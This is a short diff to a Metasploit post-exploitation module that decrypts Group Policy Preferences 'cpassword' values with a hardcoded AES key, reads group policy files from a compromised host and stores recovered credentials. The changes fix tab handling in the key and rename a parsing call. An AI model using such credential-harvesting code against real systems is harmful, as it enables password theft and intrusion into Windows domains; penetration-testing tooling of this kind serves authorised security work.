@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Post
 		key = ["
 	4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 	f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
-	".gsub(" ","").gsub("\n","")].to_a.pack("H*")
+	".gsub(" ","").gsub("\n","").gsub("\t","")].to_a.pack("H*")
 
 		cpassword += '='*((4 - cpassword.size.modulo(4)).modulo(4))
 		encoded = Rex::Text.decode_base64(cpassword)
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Post
 				rfile = client.fs.file.new(groupsfile)
 				temp = rfile.read
 				# parse xml
-				parse_user(temp) do |localuser|
+				parse_users(temp) do |localuser|
 					## store_creds
 					client.framework.db.report_auth_info(
 						:host  => client.sock.peerhost,
